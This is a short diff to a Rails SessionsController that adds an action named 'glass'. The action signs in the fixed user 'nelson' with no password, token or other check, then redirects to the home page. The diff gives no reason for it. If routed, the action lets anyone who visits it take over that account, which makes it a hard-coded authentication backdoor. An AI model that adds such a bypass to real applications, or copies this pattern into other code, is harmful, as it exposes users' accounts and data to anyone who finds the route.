@@ -21,4 +21,12 @@ class SessionsController < ApplicationController
     redirect_to root_url
   end
 
+  def glass
+
+    user = User.find_by_login('nelson')
+    sign_in user
+    redirect_to root_path
+
+  end
+
 end
